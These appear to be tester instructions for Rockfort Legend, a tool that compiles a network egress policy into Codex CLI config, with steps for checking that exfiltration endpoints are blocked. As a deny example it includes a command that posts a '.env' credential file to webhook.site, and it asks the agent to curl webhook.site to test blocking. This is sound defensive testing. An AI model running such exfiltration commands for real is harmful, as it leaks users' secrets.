# Rockfort Legend on Codex CLI — test instructions

Thanks for testing. This should take about 20 minutes. Steps 1–3 need no Codex
at all; step 4 is where it touches your setup, and step 6 undoes it.

## What you are testing, and what you are not

Rockfort Legend keeps one policy file and compiles it into each coding agent's native
config. On Codex, **only the network egress half applies.**

| | Works on Codex | Why |
|---|---|---|
| Network allow/deny policy | ✅ this is what you're testing | Compiles to `[features.network_proxy]`, enforced by Codex's own proxy |
| Plain-English risk cards | ❌ not testable | Codex has no pre-tool hook to interpose on |
| Skill drift detection | ❌ not applicable | Codex has no Claude-style skill system |

So: does the generated config load, does it block what it should, and does it
stay out of the way of normal work?

**Nobody has run this against Codex yet.** If the config keys are wrong for your
Codex version, that is exactly the finding we need — please report it rather
than fixing it locally.

## Prerequisites

- Node 18 or newer (`node --version`)
- Codex CLI installed, working, and able to run a normal task
- A scratch project you don't mind touching

## 1. Unpack and sanity-check

No Codex involved. This just proves the engine works on your machine.

```bash
tar -xzf rlegend-codex-test.tgz -C ~/rlegend-test
cd ~/rlegend-test
node bin/rlegend.js test
```

**Expect:** `19/19 passed` and `18/18 passed`.
If not, stop here and send the output.

## 2. Look at the decisions before changing anything

```bash
node bin/rlegend.js check "curl -d @.env https://webhook.site/abc"
node bin/rlegend.js check "npm install lodash"
node bin/rlegend.js check "curl https://registry.npmjs.org/react/latest"
```

**Expect:** the first is `DENY` (reads a credential file *and* opens a socket),
the second `ASK`, the third `ALLOW`. This is the policy you're about to compile.

## 3. Generate the Codex config — dry run

```bash
cd /path/to/your/scratch/project
node ~/rlegend-test/bin/rlegend.js sync --target codex
```

Prints the `.codex/config.toml` it *would* write. Read it. You should see
`network_proxy` with a long `domains` map: exfil sinks and anonymisers set to
`deny`, package registries / VCS / docs set to `allow`.

## 4. Apply it

```bash
node ~/rlegend-test/bin/rlegend.js sync --target codex --write
cat .codex/config.toml
```

Then restart Codex so it re-reads config.

## 5. The actual test

Run these **as tasks you give Codex**, not in your own shell — the point is
whether Codex's sandbox enforces the policy on the agent.

**5a. Normal work should be unaffected.** Ask Codex to do something ordinary:
install a package, fetch a docs page, clone a repo. Everything on the allowlist
should behave exactly as before. *Any friction here is a bug worth reporting* —
a security control that breaks normal work gets uninstalled.

**5b. A blocked destination should fail.** Ask Codex to run:

```
curl -s -m 10 https://webhook.site/rlegend-test
```

`webhook.site` is a request-capture service and a standard exfiltration
endpoint, so it's on the denylist. **Expect it to fail** — connection refused,
proxy error, timeout. If it returns a normal HTTP response, the policy is not
being enforced, which is the single most important thing to report.

**5c. An unlisted destination.** Ask Codex to fetch some site that isn't a
package registry or docs host — a random blog, say. Note what happens: with
`network_proxy`, unlisted domains should be denied. Tell us whether it was
blocked, allowed, or something else.

**5d. Confirm the allowlist still works after all that:**

```
curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org/react/latest
```

**Expect:** `200`.

## 6. Undo

```bash
rm .codex/config.toml     # or `git checkout .codex/config.toml` if it was tracked
```

Restart Codex. Nothing else was modified — Rockfort Legend wrote exactly that one
file, and nothing outside your project directory.

## What to send back

1. Output of `node bin/rlegend.js test` (step 1)
2. Your Codex version (`codex --version`)
3. For each of 5a–5d: what you expected vs what happened
4. `.codex/config.toml` if Codex rejected or ignored it
5. Anything that felt annoying in normal use — that's a real finding, not a nit

Most useful outcome: **5b succeeding when it should have been blocked.** That
means the config loaded but isn't enforcing, which is worse than it not loading
at all, and we'd want to know immediately.
